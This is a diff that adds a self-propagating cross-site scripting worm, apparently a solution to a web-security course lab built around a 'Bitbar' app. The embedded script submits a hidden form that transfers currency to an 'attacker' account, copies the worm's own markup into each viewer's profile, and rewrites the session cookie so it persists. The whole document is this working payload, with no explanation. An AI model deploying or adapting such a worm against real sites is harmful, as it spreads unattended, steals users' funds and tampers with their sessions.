@@ -1,0 +1,28 @@
+<div id="worm">
+    <p id="worm-head">Check your profile :)</p>
+    <span id="bitbar_count" class="10"></span>
+    <iframe id="transfer-result" name="transfer-result" hidden></iframe>
+    <form id="transfer-form" class="pure-form pure-form-stacked" action="" target="transfer-result" method="post" hidden>
+        <input type="text" name="destination_username" value="attacker">
+        <input type="text" name="quantity" value="1"/>
+    </form>
+    <iframe id="update-result" name="update-result" hidden></iframe>
+    <form id="update-form" class="pure-form pure-form-stacked" action="" target="update-result" method="post" hidden>
+        <input id="update-input" type="text" name="new_profile" value="">
+    </form>
+    <script>
+        const wormtext = document.getElementById("worm").outerHTML;
+        const transform = document.getElementById("transfer-form");
+        transform.action = `http://${document.location.hostname}:3000/post_transfer`;
+        transform.submit();
+        const updinput = document.getElementById("update-input");
+        updinput.value = wormtext;
+        const updform = document.getElementById("update-form");
+        updform.action = `http://${document.location.hostname}:3000/set_profile`;
+        updform.submit();
+        const session = document.cookie.split(";").find(v => v.trim().startsWith("session")).split("=")[1].trim();
+        const user = JSON.parse(atob(session));
+        user.account.profile = wormtext;
+        document.cookie = document.cookie.replace(session, btoa(JSON.stringify(user)));
+    </script>
+</div>
